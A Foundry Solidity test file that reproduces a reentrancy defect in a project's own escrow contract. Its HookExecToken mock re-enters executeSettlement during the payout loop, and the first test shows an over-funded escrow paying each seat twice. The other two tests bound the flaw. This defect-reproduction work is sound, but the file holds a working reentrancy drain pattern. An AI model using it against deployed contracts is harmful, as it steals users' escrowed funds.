// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "../contracts/TandaBillV2.sol";
import {FastTandaBillV2} from "../contracts/FastTandaBillV2.sol";
import {TandaBillFactory} from "../contracts/TandaBillFactory.sol";
import {Test} from "forge-std/Test.sol";

/// @notice ENGINE-71 (card t_8d3eac89): Fast-twin executeSettlement reentrancy probe.
///         Structural asymmetry vs mainline V2:
///           - V2:418 executeSettlement performs ZERO transfers (P0.1a pull model) and
///             V2:444 claimSettlement sets claimedMask bit BEFORE safeTransfer (CEI).
///           - Fast:368 executeSettlement PUSHES per-seat safeTransfer in a loop
///             (Fast:382) and writes s.settledAt AFTER the loop (Fast:388). The reentry
///             gate Fast:371 (settledAt==0 && !refunded) therefore remains OPEN for the
///             entire payout loop.
///         Probe design: HookExecToken fires its reentrant executeSettlement(0) BEFORE
///         debiting (hook-before-debit), the maximally hostile ERC20 shape.
///         Factory-lineage setup per lane law (createBill via factory, never raw initialize).

interface IFastExec {
    function executeSettlement(uint256 settlementId) external;
}

/// @notice Hook-before-debit token: first inbound transfer() reenters bill.executeSettlement(0),
///         recording inner outcome, then performs its own (deferred) debit.
contract HookExecToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public bill;
    bool public entered;
    bool public innerSucceeded;
    bool public innerReverted;

    function setBill(address b) external { bill = b; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address sp, uint256 a) external returns (bool) { allowance[msg.sender][sp] = a; return true; }

    function transfer(address to, uint256 a) external returns (bool) {
        if (!entered) {
            entered = true;
            try IFastExec(bill).executeSettlement(0) {
                innerSucceeded = true;
            } catch {
                innerReverted = true;
            }
        }
        require(balanceOf[msg.sender] >= a, "insufficient");
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        require(balanceOf[f] >= a && allowance[f][msg.sender] >= a, "no");
        balanceOf[f] -= a;
        balanceOf[t] += a;
        allowance[f][msg.sender] -= a;
        return true;
    }
}

contract Engine71FastExecReentryTest is Test {
    TandaBillFactory factory;
    address owner = address(0xA11CE);   // creator + seat 0 + funder (Gap-3 owner-fronted)
    address alice = address(0xB0B);      // seat 1
    address carol = address(0xCAFE);     // permissionless executor (Gap-2 addendum)

    function setUp() public {
        factory = new TandaBillFactory(address(new FastTandaBillV2()));
    }

    function _twoSeats() internal view returns (address[] memory s) {
        s = new address[](2); s[0] = owner; s[1] = alice;
    }

    function _deployWith(address tok) internal returns (FastTandaBillV2 bill) {
        vm.prank(owner);
        bill = FastTandaBillV2(payable(factory.createBill(IERC20(tok), _twoSeats())));
    }

    /// @notice Drive the happy lifecycle to fully-confirmed, window-elapsed state.
    ///         expense = 100e6 -> payouts [50e6, 50e6]; funding = caller-supplied.
    function _confirmRound(FastTandaBillV2 bill, HookExecToken t, uint256 expense, uint256 funding) internal {
        vm.startPrank(owner);
        t.mint(owner, funding);
        t.approve(address(bill), funding);
        bill.addExpense(expense);
        bill.fundEscrow(funding);
        bill.initiateSettlement();
        vm.stopPrank();
        vm.prank(owner); bill.confirmSettlement(0);
        vm.prank(alice); bill.confirmSettlement(0);
        vm.warp(block.timestamp + 61); // SETTLEMENT_WINDOW = 60s
    }

    /// @notice E71-1 (DEFECT REPRO, over-funded escrow F = 3x expense): the hook-before-debit
    ///         token reenters executeSettlement(0) during the FIRST push (Fast:382) while
    ///         Fast:388 has not yet written settledAt, so the Fast:371 gate passes.
    ///         Inner loop pays T; outer loop resumes and pays T again => 2T outflow from an
    ///         escrow holding surplus (F - T uncommitted after initiate). Every view still
    ///         reads a single, normally-settled round. This is a real value drain, not a
    ///         revert ghost: assertions below measure exact balances.
    function test_e71_fast_execute_reentry_double_pays_overfunded_escrow() public {
        HookExecToken t = new HookExecToken();
        FastTandaBillV2 bill = _deployWith(address(t));
        t.setBill(address(bill));
        _confirmRound(bill, t, 100e6, 300e6);

        assertEq(t.balanceOf(address(bill)), 300e6, "bill token balance pre-execute");
        vm.prank(carol);
        bill.executeSettlement(0); // permissionless executor

        // --- the drain, measured ---
        assertTrue(t.innerSucceeded(), "inner reentrant execute must have passed the open Fast:371 gate");
        assertFalse(t.innerReverted());
        assertEq(t.balanceOf(alice), 100e6, "ALICE DOUBLE-PAID: 2x payout of 50e6 (defect repro)");
        assertEq(t.balanceOf(owner), 100e6, "owner likewise 2x");
        assertEq(t.balanceOf(address(bill)), 100e6, "escrow drained 2T from F=3T; surplus leg stolen");
        (, uint64 settledAt0, uint64 initiatedAt0, uint256 expectedMask0, uint256 confirmedMask0, uint64 fullyConfirmedAt0, bool refunded0)
            = bill.settlements(0); // 7-slot getter: dynamic `payouts` member is omitted
        assertFalse(refunded0);
        assertGt(settledAt0, 0);
        initiatedAt0; expectedMask0; confirmedMask0; fullyConfirmedAt0; // silence unused
    }

    /// @notice E71-2 (bound, exact escrow F = T): the same attack cannot extract value when
    ///         no surplus exists - the outer resume leg hits the mock's balance guard,
    ///         SafeERC20Minimal surfaces it typed, and the WHOLE tx (inner included) rolls
    ///         back. Pins the "all-or-nothing revert protects exact escrow" comment's scope:
    ///         it holds ONLY for F == T, never for over-funded bills.
    function test_e71_fast_execute_reentry_reverts_at_exact_escrow() public {
        HookExecToken t = new HookExecToken();
        FastTandaBillV2 bill = _deployWith(address(t));
        t.setBill(address(bill));
        _confirmRound(bill, t, 100e6, 100e6);

        vm.startPrank(carol);
        // The FAST file ships its OWN inline SafeERC20Minimal (strict-bool shape_b,
        // FastTandaBillV2.sol:44-50) for payout sites - it masks the token's "insufficient"
        // reason behind a fixed require string. Funding uses the aliased typed lib; payout
        // reverts surface this string (documented V2/Fast divergence, XIXI-CARD-4).
        vm.expectRevert(abi.encodeWithSignature("Error(string)", "SafeERC20: strict-bool transfer required"));
        bill.executeSettlement(0);
        vm.stopPrank();

        // Full rollback: settlement still pending, nobody paid, inner effect gone.
        (, uint64 settledAt, , , , , bool refunded) = bill.settlements(0); // 7-slot getter
        assertEq(settledAt, 0, "settledAt must roll back with the failed outer leg");
        assertFalse(refunded);
        assertEq(t.balanceOf(alice), 0);
        assertEq(t.balanceOf(owner), 0);
        assertEq(t.balanceOf(address(bill)), 100e6);
        // NOTE: hook flags (entered/innerSucceeded) also rolled back with the failed top-level
        // call - the tx-wide rollback IS the proof; no post-revert flag is observable by design.
    }

    /// @notice E71-3 (refund leg holds CEI): Fast:400-side flag `s.refunded = true` is set
    ///         BEFORE the outbound safeTransfer (Fast:405), so a refund-triggered hook
    ///         reentry to executeSettlement dies on AlreadySettled. Single refund pays out,
    ///         no double. Contrast: this is exactly the missing write ordering that the
    ///         execute path (Fast:388) lacks.
    function test_e71_fast_refund_leg_cei_holds() public {
        HookExecToken t = new HookExecToken();
        FastTandaBillV2 bill = _deployWith(address(t));
        t.setBill(address(bill));

        // owner fronts 2x expense (surplus present - would feed the execute-path drain)
        vm.startPrank(owner);
        t.mint(owner, 200e6);
        t.approve(address(bill), 200e6);
        bill.addExpense(100e6);
        bill.fundEscrow(200e6);
        bill.initiateSettlement();
        vm.stopPrank();
        vm.prank(owner); bill.confirmSettlement(0); // alice NEVER confirms -> no full confirm
        vm.warp(block.timestamp + 121); // MAX_HOLD = 120s

        vm.prank(owner);
        bill.refundSettlement(0);

        assertTrue(t.innerReverted(), "reentry must die on the CEI flag set before transfer");
        assertFalse(t.innerSucceeded());
        (, uint64 settledAtR, , , , , bool refundedR) = bill.settlements(0); // 7-slot getter
        assertEq(settledAtR, 0);
        assertTrue(refundedR);
        assertEq(t.balanceOf(owner), 100e6, "single refund payout");
        assertEq(t.balanceOf(alice), 0);
        assertEq(t.balanceOf(address(bill)), 100e6, "surplus untouched");
    }
}
